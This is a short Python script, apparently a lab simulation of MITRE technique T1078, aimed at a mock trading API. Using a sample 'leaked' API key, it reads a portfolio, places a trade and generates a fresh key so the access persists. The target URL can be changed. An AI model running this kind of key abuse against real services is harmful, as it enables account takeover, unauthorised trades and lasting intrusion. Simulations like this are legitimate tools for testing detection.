#!/usr/bin/env python3
"""
T1078 Valid Accounts — API Key Abuse Simulation
Uses a leaked/stolen API key to access protected endpoints without password.
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://mock-trading-api:5000"
LEAKED_KEY = "cs_live_51HZk2x_sample_leaked_key_t1078"  # Pre-seeded leaked key for trader1

def abuse_api_key():
    print(f"[*] Testing leaked API key against {TARGET}")
    print(f"[*] Key: {LEAKED_KEY}")
    print("-" * 50)

    headers = {"X-API-Key": LEAKED_KEY}

    # Access portfolio
    r1 = requests.get(f"{TARGET}/api/portfolio", headers=headers, timeout=5)
    print(f"[+] GET /api/portfolio -> HTTP {r1.status_code}")
    if r1.status_code == 200:
        print(f"    Data: {r1.json()}")

    # Execute trade
    r2 = requests.post(f"{TARGET}/api/trade", headers=headers,
                       json={"symbol": "AAPL", "qty": 999},
                       timeout=5)
    print(f"[+] POST /api/trade -> HTTP {r2.status_code}")
    if r2.status_code == 200:
        print(f"    Data: {r2.json()}")

    # Generate NEW API key using the old one (persistence)
    r3 = requests.post(f"{TARGET}/api/key", headers=headers, timeout=5)
    print(f"[+] POST /api/key -> HTTP {r3.status_code}")
    if r3.status_code == 200:
        print(f"    NEW KEY GENERATED: {r3.json().get('api_key','')}")
        print("[!] Attacker now has a fresh key for long-term access")

if __name__ == "__main__":
    abuse_api_key()
